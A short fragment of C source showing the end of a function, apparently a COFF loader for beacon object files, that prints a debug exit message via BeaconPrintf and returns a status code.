    BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Exiting RunCOFF \n");
    return go ? 0 : 1;
}
